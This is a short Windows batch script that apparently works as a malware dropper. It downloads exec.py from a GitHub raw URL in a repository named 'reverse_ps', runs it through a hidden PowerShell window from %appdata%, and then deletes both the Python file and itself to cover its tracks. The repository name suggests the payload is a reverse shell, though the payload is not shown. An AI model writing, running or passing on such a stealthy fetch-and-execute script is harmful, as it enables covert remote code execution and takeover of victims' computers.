@echo off

set src=%cd%
cd %appdata%

curl -O https://raw.githubusercontent.com/tot-camiy-coder/reverse_ps/refs/heads/main/exec.py
powershell.exe -Window Hidden -Command cd %appdata% && python exec.py && del exec.py

cd %src%
del exec.bat
